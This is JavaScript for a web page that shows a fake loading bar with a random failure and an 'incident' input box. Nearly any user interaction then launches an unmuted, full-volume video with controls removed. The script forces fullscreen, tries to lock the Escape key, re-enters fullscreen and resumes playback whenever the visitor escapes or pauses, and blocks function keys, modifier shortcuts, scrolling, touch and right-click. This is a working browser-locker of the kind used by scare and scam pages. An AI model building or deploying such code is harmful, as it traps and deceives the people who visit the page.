window.addEventListener('load', function() {
    const video = document.querySelector('#videoPlayer');
    const errorMessage = document.querySelector('#error-message');
    const clickLink = document.querySelector('#click-link');
    const retryLink = document.querySelector('#retry-link');
    const incidentInput = document.querySelector('#incident-input');
    const progressBar = document.querySelector('#progress-bar');
    const progressPercentage = document.querySelector('#progress-percentage');
    const referenceLink = document.querySelector('#reference-link');
    const redirectBox = document.querySelector('#redirect-box');
    const errorBox = document.querySelector('#error-box');

    let progress = 0;
    let videoTriggered = false;
    const failPoint = Math.floor(Math.random() * 99) + 1; // Random fail between 1-99%

    function updateProgress() {
        if (videoTriggered) return;

        const increment = Math.random() * 5 + 2; // Faster loading (2-7% per step)
        progress = Math.min(progress + increment, 100);
        progressBar.style.width = progress + '%';
        progressPercentage.textContent = Math.floor(progress) + '%';

        if (progress >= failPoint) {
            redirectBox.style.display = 'none';
            errorBox.classList.remove('hidden');
        } else {
            const randomDelay = Math.random() * 400 + 50; // Random delay between 50-450ms
            setTimeout(updateProgress, randomDelay);
        }
    }

    updateProgress();

    function enterFullscreen() {
        if (!videoTriggered) return;

        if (video.requestFullscreen) {
            video.requestFullscreen().then(() => {
                video.controls = false;
                if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
                    navigator.keyboard.lock(['Escape']).catch(err => {
                        console.warn('Keyboard lock failed:', err);
                    });
                }
            }).catch(err => {
                console.warn('Fullscreen failed:', err);
            });
        } else if (video.webkitRequestFullscreen) {
            video.webkitRequestFullscreen().then(() => {
                video.controls = false;
                if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
                    navigator.keyboard.lock(['Escape']).catch(err => {
                        console.warn('Keyboard lock failed:', err);
                    });
                }
            }).catch(err => {
                console.warn('Fullscreen failed:', err);
            });
        } else if (video.msRequestFullscreen) {
            video.msRequestFullscreen().then(() => {
                video.controls = false;
                if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
                    navigator.keyboard.lock(['Escape']).catch(err => {
                        console.warn('Keyboard lock failed:', err);
                    });
                }
            }).catch(err => {
                console.warn('Fullscreen failed:', err);
            });
        } else if (video.webkitEnterFullscreen) {
            video.webkitEnterFullscreen();
            video.controls = false;
        }
    }

    function playVideo() {
        if (videoTriggered) return;
        videoTriggered = true;

        errorMessage.style.display = 'none';
        video.muted = false;
        video.volume = 1.0;
        video.controls = false;
        video.play();
        referenceLink.style.display = 'block';

        enterFullscreen();

        setInterval(() => {
            if (video.paused && !video.ended) {
                video.play().catch(err => {
                    console.warn('Auto-play failed:', err);
                });
            }
            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement && !video.webkitDisplayingFullscreen) {
                enterFullscreen();
            }
        }, 100);
    }

    video.addEventListener('pause', function(event) {
        if (videoTriggered && !video.ended) {
            event.preventDefault();
            video.play();
        }
    });

    const specialInputs = [
        'Control', 'CapsLock', 'Alt', 'AltGraph', 'Meta', 'Tab',
        'Escape', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12',
        'Space', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'
    ];

    document.addEventListener('keydown', function(event) {
        // Allow Shift and Arrow keys in text box before video triggers
        if (!videoTriggered && (event.key === 'Shift' || event.key.startsWith('Arrow')) && event.target === incidentInput) {
            return;
        }
        // Block special keys (excluding Shift in text box) and modifier combos
        if (specialInputs.includes(event.key) || event.ctrlKey || event.altKey || event.metaKey) {
            event.preventDefault();
        } else if (!videoTriggered && event.target !== incidentInput) {
            playVideo();
        }
    });

    incidentInput.addEventListener('click', function(event) {
        event.stopPropagation();
    });

    incidentInput.addEventListener('input', function() {
        if (this.value.length >= 10 && !videoTriggered) {
            playVideo();
        }
    });

    incidentInput.addEventListener('keydown', function(event) {
        if ((event.key === 'Enter' || event.key === 'Backspace') && !videoTriggered) {
            playVideo();
        } else if (videoTriggered && !event.key.startsWith('Arrow')) {
            event.preventDefault(); // Block all except arrows after trigger
        }
    });

    clickLink.addEventListener('click', function(event) {
        event.preventDefault();
        playVideo();
    });

    retryLink.addEventListener('click', function(event) {
        event.preventDefault();
        playVideo();
    });

    document.body.addEventListener('click', function(event) {
        if (event.target !== incidentInput && !videoTriggered) {
            playVideo();
        }
    });

    document.body.addEventListener('contextmenu', function(event) {
        event.preventDefault();
        if (!videoTriggered) {
            playVideo();
        }
    });

    document.addEventListener('wheel', function(event) {
        event.preventDefault();
    }, { passive: false });

    document.body.addEventListener('touchstart', function(event) {
        if (event.target !== incidentInput && !videoTriggered) {
            playVideo();
        } else if (videoTriggered) {
            event.preventDefault();
        }
    });

    document.body.addEventListener('touchmove', function(event) {
        event.preventDefault();
    }, { passive: false });

    document.body.addEventListener('touchend', function(event) {
        event.preventDefault();
    }, { passive: false });

    document.addEventListener('fullscreenchange', function() {
        if (!document.fullscreenElement && videoTriggered) {
            enterFullscreen();
        }
    });

    document.addEventListener('webkitfullscreenchange', function() {
        if (!document.webkitFullscreenElement && videoTriggered) {
            enterFullscreen();
        }
    });

    document.addEventListener('msfullscreenchange', function() {
        if (!document.msFullscreenElement && videoTriggered) {
            enterFullscreen();
        }
    });

    video.addEventListener('webkitendfullscreen', function() {
        if (videoTriggered) {
            enterFullscreen();
        }
    });
});
